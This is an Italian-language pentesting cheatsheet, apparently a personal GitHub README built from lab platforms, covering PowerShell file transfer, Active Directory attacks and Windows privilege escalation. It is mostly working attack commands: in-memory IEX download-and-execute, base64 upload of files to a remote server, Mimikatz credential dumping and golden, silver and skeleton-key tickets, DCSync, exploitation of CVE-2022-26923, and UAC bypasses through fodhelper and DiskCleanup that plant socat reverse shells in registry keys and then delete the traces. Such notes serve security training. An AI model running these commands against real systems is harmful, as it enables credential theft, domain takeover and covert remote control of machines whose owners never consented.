# Lista Link  
_Lista di comandi powershell generali, che vanno dalla info alla gestione dei file:_

 [Comandi Powershell:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell)
<!-- spazio -->
   - [Comandi Powershell info generali PC](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell-info-generali-pc)
 <!-- spazio -->
   - [Comandi per i file](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#comandi-per-i-file)
       - [Download/Upload file](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#downloadupload-file)
 <!-- spazio -->
   - [Comandi ADS (Alternate Data Stream)](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#comandi-ads-alternate-data-stream)
  
_Lista che viene aggiornata man mano con metodologie, tool, comandi e CVE inerenti al mondo dell Active Directory:_

 [Active Directory Pentest:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#active-directory-pentest)
<!-- spazio -->
   - [Tools](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/edit/main/README.md#tools):
       - [Powerview](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#Powerview)
       - [Bloodhund settings](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#bloodhund-settings)
       - [Mimikatz](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#mimikatz)
       - [Suite impacket e  utilizzi](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#suite-impacket-e-vari-utilizzi)
<!-- spazio -->
   - [CVE Active Directory:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#cve-active-directory)
        - [CVE-2022-26923](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#cve-2022-26923-vulnerabilit%C3%A0-sui-certificati-dellad)
<!-- spazio -->
   - [Privilege Escalation Tramite Misconfiguration](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#privilege-escalation-tramite-misconfiguration)
   - [DACL attacks:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)
        - [WriteDACL](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)
   - [Bypass UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-uac)
   - [Bypass AMSI](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#amsi)
<!-- spazio -->
   - [Note pentest](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-pentest)
<!-- spazio -->
_Nozioni e note di diverso tipo inerenti a windows:_

 [Windows:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#windows)
<!-- spazio -->
   - [Processi di avvio](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/tree/main#processi-di-avvio)
<!-- spazio -->
   - [Register keys](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#register-keys)
<!-- spazio -->
   - [UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac)
<!-- spazio -->
   - [AMSI](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#amsi)
<!-- spazio -->
   - [Note sulla sicurezza in Windows](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-sulla-sicurezza-in-windows)
<!-- spazio -->
# Comandi Powershell:
<!-- -->
    fl #per ricevere più output 
<!-- -->
ES: 
_Get-Acl | fl_
<!-- -->
    Get-Help <nome comando > -Full #ottieni l'help dei comandi
 <!-- spazio -->
    Update-Help -Force #per aggiornare gli help alla versione più recente    
 <!-- spazio -->
    Select-Object #utilizzato per prendere un campo dell'oggetto specifico 
ES:
_Get-LocalUser John | Select-Object LastLogon_
<!-- -->
    Get-Command #utilizzato per sapere se un comando o un eseguibile è presente in powershell
<!-- spazio -->
    New-LocalUser  #per creare nuovi utenti locali
<!---->
ES:
_New-LocalUser -Name User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)_
<!-- -->
    New-LocalGroup #per creare un nuovo gruppo
<!-- -->
ES:
_New-LocalGroup -Name $Group_
<!-- -->
    Add-LocalGroupMember #aggiungi un utente ad un gruppo
<!-- -->
ES:
_Add-LocalGroupMember -Group $Group -Member $User_
<!---->
    reg query #per interrogare i registri
<!-- spazio -->
    New-item #per creare file, cartelle o modificare valori
 <!-- spazio -->
    Set-item #per modificare file, cartelle o modificare valori
<!-- spazio -->
    Start-service <nome servizio> #comando per avviare un servizio     
ES:
_Start-service WinRM_
<!-- spazio -->
 ### Comandi Powershell info generali PC  

    Get-ComputerInfo #prendi informazioni della macchina
<!-- spazio -->
    Get-Localuser #listi gli utenti nella macchina
<!-- spazio -->
    Get-ScheduledTask #listi tutti gli schedule task /tasklist
<!-- spazio -->
    Get-Acl #per listare le access-list dei permessi
<!-- spazio -->
    Get-PSDrive  #lista i drive dell'ambiente legati a powershell che possono essere variabili,oggetti,registri e volumi.
<!-- spazio -->  
    Get-ADDomain #per prendere tutte le informazione dell'AD Domain
<!-- spazio -->  
     Get-NetIPAddress #comando powershell per ottenere configurazione di rete
<!-- spazio -->     


### Comandi per i File
<!-- spazio -->
      Get-Content -path "<file>" # comando per leggere il contenuto
ES:
<!-- spazio -->
_(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)_
<!-- spazio -->
      [IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #dalla classe IO.FILE richiama WriteAllBytes che scrive i Bytes
<!-- spazio -->

##### Download/Upload File
__Download:__
<!-- spazio -->
      curl -o reverse.exe http://<ip source>/<file da scaricare>
<!-- spazio -->
      (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #semplice download
 <!--spazio -->
      (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')#download async cioè senza bloccare il calling thread
 <!--spazio -->
      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #Bypassing controllo certificato 
 <!--spazio -->
_possiamo trasferire un file senza dovre scaricare uno script ma runnarlo direttamente in memoria:_ 
 <!-- spazio -->
      IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) # tramite IEX(Invoke-Expression) runniamo direttamentei in memoria
 <!-- spazio -->
 __Upload__
  <!-- spazio -->
 __N.B importante e avviare un server upload che riceva i file.__
  <!-- spazio -->
 _Comandi per avviare un server upload python e comandi powershell per inviare:_
 <!-- spazio -->
      pip3 install uploadserver #modulo che permette l'avvio di un uploadserver
<!-- spazio -->
      python3 -m uploadserver #comando per avviarlo e funzionerà sulla porta 8000
<!-- spazio -->
 _Ci sono 2 metodologie di download che cambiano in base ai permessi che abbiamo:_ 
 <!-- spazio -->
 - 1 se abbiamo possibilita di scaricare da internet possiamo utilizzare questi comandi:
 <!-- spazio -->
         IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') #comando per scaricare e poi avviare lo script
 <!-- spazio -->
         Invoke-FileUpload -Uri <URL dove fare upload del file -destination> -File <Path file di cosa caricare -source>  #comando dello script per fare upload
 <!-- spazio -->
 - 2 se non abbiamo possibilità di scaricare da internet ma siamo collegati tramite VPN (HTB o THM) possiamo importare il .ps1 che permette l'upload e poi
      runnare lo script:
 <!-- spazio -->
         . .\PSUpload.ps1 #comando per avviare lo script
<!-- spazio -->
         Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script per fare upload
 <!-- spazio -->
_Upload tramite encoding in base64:_ 
<!-- spazio -->
      b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
      #variabile che stora il base64 del file
<!-- spazio -->      
      Invoke-WebRequest -Uri <ip server> -Method POST -Body $b64 #inviamo il base64 del file tramite richiesta POST
<!-- spazio -->
_SMB_
_Comando per avviare il server SMB per l'upload:_ 
 <!-- spazio -->
      sudo impacket-smbserver <Nome share da inserire nel comando di upload> -smb2support <share locale che condividi>
<!-- spazio -->
      copy <path del file da copiare>  \\<ip target>\<nome share a cui accedere> #comando per fare upload, facendo una copia sul server SMB upload
<!-- spazio -->
      net use n: \\<ip target>\share /user:test test #fare il mount da di un SMB su una windows machine
<!-- spazio -->
    
### comandi ADS (alternate data stream)
<!-- -->
_Utili per gestire risorse ADS_

      Get-Item -path <path> -stream * #ottiene tutti gli ADS (alternate datastream di un file)
<!-- -->
      set-content -path <path del file> -stream <nome del nuovo stream> #crea un nuovo ADS e apre un terminale in cui è possibile scrivere il nuovo ADS
<!-- -->
      gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' #cerca in tutto il filesystem la presenza  di ADS
<!-- -->
      remove-item –path <path al file> –stream <nome stream da rimuovere> #rimuove lo stream su un determinato file
<!-- -->

# Active Directory Pentest:

_comandi SMB:_
<!-- spazio -->

    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- spazio -->

    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- spazio -->

    smbclient  \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- spazio -->
_enumerazione del DC:_
Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti e SMB e altro:
<!-- spazio -->

    enum4linux <ip> #enumerazione
    
_enumerazione utenti:_
<!-- spazio -->

-crackmapexec, però se abbiamo l'accesso a IPC$ all'interno di SMB:
<!-- spazio -->

    crackmapexec smb VULNNET-RST -u 'guest' -p '' --rid-brute
<!-- spazio -->

-kerbrute, tramite una lista di user possiamo vederee che Users ci sono:
<!-- spazio -->

    kerbrute_linux_amd64 userenum -d <domain_name> --dc <domain_controller_ip> <wordlist>
<!-- spazio -->

_recupero TGT utenti:_
<!-- spazio -->

    impacket-GetNPUsers <dominio>/<utente> -no-pass #funziona solamente con utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH
<!-- spazio -->

_recupero credenziali:_
<!-- spazio -->

    impacket-secretsdump -dc-ip <ip della macchina> <utente>:<password>@<ip macchina> #recupera NTDS.DIt, SAM hashes
<!-- spazio -->
_connessione remota alla target machine e comandi utili:_
<!-- spazio -->

    evil-winrm -i <nome dominio> -u <nome utente> -H <hash NTLM> o -p <password> #utilizziamo il WinRM protocol per connettersi
<!-- spazio -->
    upload <path file da dove caricare> <nome di come salvarlo> #comando per uplodare dalla kali alla target machine il file
<!-- spazio -->
    download <path file dove scaricare> <path file dove salvare> #comando per il download del file dalla target machine alla kali
<!-- spazio -->
_utilizzo di responder che tramite LLMNR(Link-Local Multicast Name Resolution poisoning) recupera le credenziali in chiaro._
<!-- spazio -->
    sudo responder -I <interfaccia di rete>
<!-- spazio -->
_attacchi MITM._
<!-- spazio -->
     sudo python3 mitm6.py -i <interfaccia di rete> -d <nome dominio target> #tool utilizzato per il man in the middle su ipv6
<!-- spazio -->

### Tools:

##### Powerview

_Scaricare PowerView.ps1 sulla macchina e avviarlo:_
<!-- spazio -->
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
<!-- spazio -->

_dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:
enumerare gli utenti a dominio:_

    Get-NetUser #ottiene le informazioni sugli utenti

<!-- spazio -->

    Get-NetUser | select cn #per ottenere solo il common name

<!-- spazio -->

    Get-NetGroup    #ottiene tutti i gruppi presenti a dominio

<!-- spazio -->

    Get-NetGroup -GroupName *admin*    #ottiene tutti i gruppi in cui è presente la parola admin

<!-- spazio -->

    Invoke-ShareFinder    #ottiene tutte le shares smb del dominio

<!-- spazio -->

    Get-NetComputer -FullData    #ottiene tutte le informazioni su tutti i pc della rete

<!-- spazio -->

    Get-NetComputer -FullData | Select-Object logoncount    #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi    

<!-- spazio -->

      Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose #comando per aggiungere un oggetto alle       ACL
<!-- -->

_Sopra vengono riportati i comandi utilizzati più di frequente, per una visione più completa dei comandi andare [qui](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)._
##### Bloodhund settings

__Bloodhound è un tool che permette l'organizazione delle informazioni ottenute dalla fase di recognition del'AD e domini Windows__

__Abbiamo bisogno di due tools: bloodhound e neo4j (che farà da database per bloodhound)__

      sudo apt install neo4j && sudo apt install bloodhound
<!-- -->

      neo4j console #apriamo la console di neo4j per startare il db
<!-- -->
_Dobbiamo navigare sull'interfaccia web di neo4j per loggare e cambiare la password di default.
Cerchiamo perciò http://localhost:7474/ e logghiamo con le credenziali di default (neo4j:neo4j)
e inseriamo la nostra nuova password._
<!-- -->
_Avviamo adesso bloodhound:_

      bloodhound

<!-- -->
_sulla macchina vittima (windows a dominio) su cui abbiamo RCE eseguiamo questo comando
(lo script powershell deve essere ovviamente già sulla macchina)_

      . .\SharpHound.ps1
      Invoke-BloodHound -CollectionMethod All -OutputDirectory "<Path della cartella dove salvare lo zip>"
<!-- -->
_adesso scarichiamo il file sulla nostra macchina;
una volta fatto questo andiamo sull'interfaccia grafica di bloodhound e importiamo il file strisciandocelo sopra oppure selezionando l'icona importa mappa._

##### Mimikatz:
_Mimikatz è utilizzato per recuperare hash, password, recupero e creazione di ticket kerberos._

__Consigliamo di utilizzare mimikatz integrato con meterpreter per una maggiore praticità.__

Commandi:
<!-- -->
      privilege::debug #comando per assicurarsi di runnare mimikatz come amministratore
<!-- -->
      lsadump::lsa /patch #comando per recupere NTLm hash
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid utente> /krbtgt:<NTLM utente> /id:<id utente> #comando per creare un golden ticket
<!-- -->
_Golden ticket si ha accesso a tutti i servizi del kerberos._
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid servizio> /krbtgt:<NTLM servizio> /id:<id servizio> #comando per creare un silver ticket
<!-- -->
_Silver ticket si ha accesso ad un servizio del kerberos è più silensiozo del golden._
<!-- -->
      misc::cmd #apre un cmd nuovo
<!-- -->
      sekurlsa::tickets /export #comando per esportare i .kirbi tickets e li recupera da LSASS memoria
<!-- -->
      kerberos::ptt <ticket> #comando per fare il pass the ticket
<!-- -->    
      !+
      !processprotect /process:lsass.exe /remove
      misc::skeleton
      !- #comandi per creare una skeleton key
<!-- -->    
      
##### Suite impacket e utilizzi:
_in questa sezione vengono spiegati cosa e come funzionano i vari tool della suite Impacket._
<!-- -->
      impacket-GetUserSPNs #sfrutta la vulnerabilita di kerberoasting per ottenere gli SPN(Service Principal Name) dei vari servizi
ES:_impacket-GetUserSPNs <nome_dominio> backslash <user> duepunti <password> -dc-ip <ip_domain_controller> -request_
<!-- -->
      impacket-GetNPUsers  #sfrutta la misconfigurazione di utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH del kerberos cioè autenticarsi senza richiedere la password
<!-- -->
ES:_impacket-GetNPUsers <nome_dominio>backslash<nome_account> -no-pass_
<!-- -->
      impacket-secretsdump #recupera NTDS.DIt, SAM hashes locali
<!-- -->
ES:_impacket-secretsdump -dc-ip <ip_del_domain_controller> <nome_account>:<passoword>@<ip_domain_controller>_ 
<!-- -->     
      impacket-ntlmrelayx #ruba le credenziali NTLM quando vengono inviate tra utenti
<!-- -->
ES:_impacket-ntlmrelayx -6 -t ldaps://<ip_target> -wh wpad.<dominio> -l <directory_dove_salvare>_ 
<!-- -->
      impacket-addcomputer #comando per aggiungere un computer a dominio
_aggiungere la macchina remota compromessa alla propria rete locale (con ldaps) di macchine con impacket per exploit successivi_
<!-- spazio -->
      impacket-addcomputer '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
<!-- spazio -->
ES:_impacket-addcomputer -dc-ip <domain_controller_ip> -computer-name <nome_computer> -computer-pass '<password>' '<nome_tdl_dominio><!-- -->:<!-- --><username>:<password>'_
<!-- -->
      impacket-smbserver #comando per startar un smb server
<!-- -->
ES:_impacket-smbserver <Nome_share_da_inserire_nel_comando_di_upload> -smb2support <share_locale_che_condividi>_
<!-- -->
_generare certificati come utente (semplice) autenticato per testare l'exploit CVE-2022-26923_
<!-- -->
      sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_ceritficato> -ca          
      <dominio_certificate_autority>
<!-- -->
### CVE Active Directory:

##### CVE-2022-26923 (Vulnerabilità sui certificati dell'AD)
<!-- -->
   _La vulnerabilità sfrutta la misconfigurazione dei certificati nell'AD e la possibilità che un utente può aggiungere fino a 10 macchine al gruppo machine    dell'active directory, esitono 2 template quello User e quello machine, lo User non è sfruttabile in quanto non possiamo modificare i parametri del __UPN__ (User Principal Name) che si trova dentro al __SAN__ (Subjec ALternative Name) invece nel template machine, dopo aver aggiunto un nuova macchina al gruppo dei computer possiamo generare un certificato in cui cambiamo il DNS hostname con quello del domain controller e ottenere NTLM Hash._
<!-- --> 
_Comandi:_
<!-- -->
      . ./Certify.exe find /vulnerable #per verificare se vulnerabile
<!-- -->
      sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_certificato> -ca       
      <dominio_certificate_autority> #comando per generare un certificato /#se selezionamo il template machine, al computer aggiunto va scritto un $ alla fine del       nome
<!-- -->
      certipy-ad auth -pfx <file configurazione>.pfx #fa la convalida del certificato interrogando il kerberos e prova a recuperare NTLM hash dell'account con impacket
<!-- -->
_Comandi powershell per modificare le proprità di un computer nell'AD:_ 
<!-- -->
      impacket-addcomputer '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
      #aggiungere il computer al gruppo della machine di active directory 
<!-- -->
      Get-ADComputer <nome computer> -properties dnshostname,serviceprincipalname
<!-- -->
      Set-ADComputer THMPC -ServicePrincipalName @{}#importante rendere vuoto SPN perchè entra in conflitto con quello dell'active directory
<!-- -->
      Set-ADComputer <nome dominio> -DnsHostName <nome del completo del dominio>
<!-- -->
_Rigenerare il certificato di template machine e tramite __Certipy auth__ prendere NTLM hash e il gioco è fatt0._
<!-- -->

# Privilege Escalation Tramite Misconfiguration
 _alcuni metodi per scalare i propri privilegi in windows e controllare permessi che potrebbero essere vettore di scalata_
 <!---->
 _Per controllare le misconfiguration utilizzeremo accesschk.exe contenuto nella suite di sysmon scaricabile dal seguente [link](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):_
 <!---->
    accesschk.exe /accepteula -uwcqv <nome_utente> <nome_servizio> #restituisce i permessi dell'utente relativi al servizio ricercato
 <!---->
 _se l'utente ha il seguente privilegio __"SERVICE_CHANGE_CONFIG"__ può esseere vettore di scalata:_
 <!---->
 _facciamo una query al servizio per controllare che giri come SYSTEM (o LocalSystem) sotto la voce __"SERVICE_START_NAME"___
 <!---->
    sc qc <nome_servizio> #fa una query al servizio per ottenere i suoi dettagli
 <!---->
 _a questo punto possiamo sostituire il binario puntato dal servizio con uno creato da noi per farlo eseguire al riavvio:_
 <!---->
    sc config <nome_servizio> binpath= "\"<path_al_nostro_eseguibile>\"" #indichiamo la path con gli apici attraverso l'escape char
 <!---->
    net start <service> #avviando il servizio verrà lanciato il nostro eseguibile come amministratore
 <!---->
_abusare di path non racchiuse da doppi apici ""_
 <!---->
_se la path di un servizio è scritta nel seguente modo, posso inserire un mio eseguibile chiamato come la prima parola della path prima dello spazio (se ho permessi di utilizzo della cartella e se il servizio ha i privilegi del punto precedente)_
<!---->
    BINARY_PATH_NAME   : <Path_al_servizio>\Common files\.. #non racchiusa dalle virgolette ed inizia con common
<!---->
    copy <Path_del_nostro_eseguibile> "<path_del_servizio>\Common.exe" #così facendo il sistema cercerà la path e arrivato allo spazio eseguirà il nostro comando prendendo i dati successivi come argomenti dell'eseguibile
<!---->
    net start <service_name>
<!---->
_Abusare di eccessivi permessi nelle chiavi di registro:_
<!---->
    sc qc <nome_servizio> #fa una query al servizio
<!---->
    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<nome_servizio> #controlla i permessi e chi ha accesso alle chiavi di un servizio di resgistro
<!---->
___"NT AUTHORITY\INTERACTIVE"__ se le chiavi sono accessibili da questo gruppo significa che tutti gli utenti con logon possono modificarle:_
<!---->
    reg add HKLM\SYSTEM\CurrentControlSet\services\<nome_servizio> /v ImagePath /t REG_EXPAND_SZ /d <path_nostro_eseguibile> /f
<!---->
    net start regsvc
<!---->
_Abusare permessi di scrittura sui file dei servizi:_
<!---->
    copy <nostro_eseguibile> <path_del_binario_del_servizio> #se abbiamo permessi di scrittura sull'eseguibile del servizio possiamo sostituirlo con il nostro 
<!---->
_Abusare degli autorun attraverso le chiavi di registro:_
<!---->
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #interroga i registri per cercare autorun
<!---->
    accesschk.exe /accepteula -wvu "<path_dell_eseguibile>" #ricerca le proprietà degli eseguibili
<!---->
_se l'eseguibile è word-writable possiamo sostituirlo con il nostro e riavviare la macchina:_
<!---->
    copy <nostro_eseguibile_da_runnare> "<path_dell_autorun>" /Y  #dopo il riavvio si attiverà automaticamente
<!---->
### DACL attacks:
_viene riportata una lista/metodologia di attacchi alla discretionary access list tramite delle misconfigurazioni:_

##### WriteDACL
_Viene sfruttata la misconfigurazione di poter editare la DACL, crei un user, lo aggiungiamo ai gruppi __"Remote Management Users"__ per controllare l'utente a distanza, al gruppo
__"Exchange Windows Permissions"__ gruppo dell'Active Directory che permette di modificare i permessi di dominio, infine importiamo powerView e tramite il comando __"Add-DomainObjectAcl"__ con __"-rights"__ DCSync potremmo dumpare tutti gli hash di dominio con secretsdump._
<!-- -->
       New-LocalUser <nome_account> -Password (echo "<password>" | convertTo-SecureString -AsPlainText -force) -FullName "<nome_completo>" -Description "<descrizione>"
<!---->
      _Add-localGroupMember -Group "Remote Management Users" -member tester4_
<!-- -->
      Add-localGroupMember -Group "Exchange Windows Permissions" -Member <nome_utente>
<!-- -->
_Questo comando aggiunge un ACL oggetto all'ACL list per un utente a dominio  con diritti DSync che permettono di dumpare tutti gli hash a dominio:_
<!-- -->
      Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose
<!-- -->

### Bypass UAC

__Per sapere cos'è l'UAC e come funziona andare [qui](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac)__

_Nella relativa sezione parliamo di diversi casi per il bypass delll'UAC, l'interi argomenti trattati sono presi dalla free room di [TryHackMe](https://tryhackme.com/room/bypassinguac) per poi essere spiegati più approfonditamente con un tocco personale._

- Caso di compromissione GUI:

1) msconfig.exe: 

_cliccando tasto windows+R, scrivendo e aprendo msconfig e infine aprendo __processhacker__ potremmo notare che msconfig runna con un high token, grazie alla sua autoelevation apre direttamente il programma con i più alti privilegi e se andiamo nella sezione __tools__ del programma, cerchiamo command prompt potremmo ottenere una shell con permessi elevati._

2) azman.msc __(vecchia utility winserver 2003 utilizzata per gestire i permessi)__:

_aprendo esegui, avviando azman.msc anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __help o ?__ cliccando su guida e poi continuando con un click destro e selezionando __HTML o source code__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._ 

3) mmc.exe:

_Funziona anche con mmc.exe anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __help o ?__ cliccando su guida e poi continuando con un click destro e selezionando __HTML o source code__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._

- Caso di compromissione AutoElevation:

1) fodhelper __(executable di windows per le lingue)__:

_Avviando possiamo notare che avrà un IL high, usando procmon.exe possiamo osservare che il sistema operativo va a ricercare quale software utilizzare per aprire fodhelper questo perchè nei sistemi operativi Windows esiste il ProgID cioè ad un'estensione è associata un programma di default ed è specificato in genere all'interno della chiave HKEY_CLASSES_ROOT che è un'insieme delle chiavi (HKCU e HKEY).
Nell'exploit possiamo notare che nella HKCU, più precisamente nella subykey con questo path __"shell/open/command"__ è dove viene anche specificato il ProgID possiamo  bypassare la system wide association(data un estensione tipo .txt, utilizziamo programma/i di default) andando ad inserire una revshell nella subkey, cosi facendo otteremo una shell privilegiata perchè lo stessto programma è avviato con IL high:_
__N.B: è importante almeno essere nel gruppo amministratori per poter editare i registri.__

Commandi:
<!-- -->
      net user <nome utente> | find "Local Group" #comando per vedere il gruppo di appartenenza 
<!-- -->
      whoami /groups | find "Label" #comando per capire il proprio IL
<!-- -->
      set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command #settare una variabile d'ambiente con il path specificato 
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<porta> EXEC:cmd.exe,pipes" #comando che crea una variabile d'ambiente che crea al suo interno un socat per       la revshell
<!-- -->
      reg add %REG_KEY% /v "DelegateExecute" /d "" /f #viene aggiunta la chiave di registro.
      /v specifica il nome 
      /d i dati all'interno
      /f force per evitare ogni prompt di conferma
<!-- -->
      reg add %REG_KEY% /d %CMD% /f #comando per inserire la revshell
<!-- -->
      nc -lnvp <port> #comando per aprire listener sulla nostra macchine
<!-- -->
      fodhelper.exe #comando per avviare l'eseguibile
<!-- -->
      reg delete HKCU\Software\Classes\ms-settings\ /f #comando per eliminare e quindi pulire le tracce
<!-- -->
_Dopo aver fatto tutti i comandi ed infine avviato l'eseguibile e se avremmo anche aperto un listener dovremmo ottenere la revshell con un IL high._

2) fodhelper con AV attivo:

_abbiamo l'AV attivo bene per bypassare l'antivirus viene messa appunto una strategia efficare tramite l'utilizzo di Curver entry(Curver entry è utilizzato quando si hanno più istanze di uno stesso software ma di diverse versioni, curver permette a Windows di utilizzare la versione di default)._

Commandi:
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes" #comando per la revshell
<!-- -->
      reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f #creiamo la subkey .thm con all'interno la revshell
<!-- -->
      reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f #creiamo la subkey curver che punta alla subkey .thm contenente la revshell
<!-- -->
      nc -lnvp <port> #creiamo il listener
<!-- -->
      fodhelper.exe #startiamo l'eseguibile
<!-- -->
Abbiamo ottenuto la revshell con IL high anche se attivo l'antivirus

Possono sorgere dei problemi se nelle UAC settings è attiva l'opzione Always Notify perchè ogni modifica deve essere autorizzata esempio l'exploit di fodhelper
però c'è ancora un modo per bypassare UAC è tramite gli scheduler task, che sono avviati da utenti normali ma eseguiti con privilegi d' amministratore e il tampering di variabili d'ambiente.

- Bypass tramite scheduler:

1) DiskCleanup:

_Andando a visionare lo scheduler task e cercano il DiskCleanup possiamo notare che ogni utente può utilizzarlo e verrà eseguito con privilegi di amministratore
N.B(la voce __"Run with highest privileges"__  eredita IL da chi lo avvia quindi da un'utente non-admin avrà IL medium).
Andando poi nella sezione __"Actions"__ possiamo notare che runna il programma tramite comando cmd e fin qui tutto normalre, tranne per le variabili d'ambiente che possono essere modificate a nostro vantaggio._

Comandi:
<!-- -->
      reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes &REM" /f
      #crea una subkey con nome windire che simula la varible d'ambiente %windir% e che poi ha al suo interno una revshell il $REM serve a commentare il resto
<!-- -->
      nc -lnvp <port> #comando per il listener
<!-- -->
      schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I #avvia il task con la revshell 
<!-- -->
      reg delete "HKCU\Environment" /v "windir" /f #comando per eliminare la subkey creata in precendenza
<!-- -->
_Esiste un tool chiamato [UACME](https://github.com/hfiref0x/UACME) che automatizza il bypass dell'UAC._

### Note Pentest
_WebDav protocollo che estende HTTP per la connessione in remoto._

_DavWWWRoot è una parola speciale riconosciuta dalla windows shell, utilizzata quando si vuole connettere ad un WebDav server, questa parola
specifica di voler connettersi alla root del server._

_SPN(Service Principal Name) sono identificatori nell'AD per identificare dei servizi o risorse come un server SQL._

_Commando per avviare il subsystem di linux._
<!-- -->
      Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
<!-- -->
# Windows:

### Processi di avvio

_Task manager, GUI che permette di vedere i processi che runnano con varie informazion inerenti a loro._

__N.B è consigliato nella sezione __"Details"__ di aggiungere le colonne "Image Path Name" e "Command Line"
per vedere cosa un processo fa e il suo path e per avere una visione d'insieme utilizzare processhacker o procmon.__

_Schema per semplificare la spiegazione dei processi:_

_system (Primo processo, colui che da il via a tutto)_

Sytem crea:

- _smss.exe (Session Manager Subsystem ,processo che crea nuove sessioni e variabili d'ambiente, si termina da solo)_

smss.exe crea:
          
- _win32k.sys (kernel mode, si occupa della GUI di windows)_
  
- _winsrv.dll (user mode, gestisce le attività legate alla creazione, gestione e interazione con il desktop di Windows)_
  
- _csrss.exe (user mode, responsabile della Win32 console, creazione e eliminazione di thread, rende disponibile le API ad altri processi)_

csrss.exe crea:

- _winlogon.exe (session 1, sessione utente si occupa del logon e logoff utenti)_

- _wininit.exe (session 0, una sessione isolata per il sistema operativo windows, si occupa dell'avvio)_

wininit.exe crea:

- _explorer.exe (si occuppa dell'accesso a file e cartelle per l'utente)_

